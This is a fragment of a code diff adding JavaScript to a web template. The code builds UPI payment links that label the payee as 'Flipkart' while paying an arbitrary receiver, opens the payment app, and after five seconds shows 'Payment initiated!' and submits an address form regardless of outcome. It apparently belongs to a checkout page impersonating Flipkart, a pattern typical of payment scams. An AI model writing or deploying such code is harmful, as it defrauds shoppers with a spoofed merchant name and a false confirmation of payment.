+        var link = appLinks[method.type] || ('upi://pay?pa=' + receiver + '&pn=Flipkart&am=' + amount + '&cu=INR&tn=Order_' + orderNumber);
+        
+        closeModal();
+        showToast('⏳ Opening payment app...', 'info');
+        
+        window.open(link, '_blank');
+        
+        setTimeout(function() {
+            showToast('✅ Payment initiated!', 'success');
+            var form = document.getElementById('address-form');
+            if (form) {
+                form.submit();
+            }
+        }, 5000);
+    }
+    
+    function showToast(message, type) {
+        type = type || 'info';
+        var existing = document.querySelector('.fk-toast-message');
+        if (existing) existing.remove();
+        
+        var toast = document.createElement('div');
+        toast.className = 'fk-toast-message ' + type;
+        toast.textContent = message;
+        document.body.appendChild(toast);
+        
+        requestAnimationFrame(function() {
+            toast.classList.add('show');
+        });
+        
+        setTimeout(function() {
+            toast.classList.remove('show');
+            setTimeout(function() { toast.remove(); }, 400);
+        }, 3000);
+    }
+</script>
+{% endblock %}
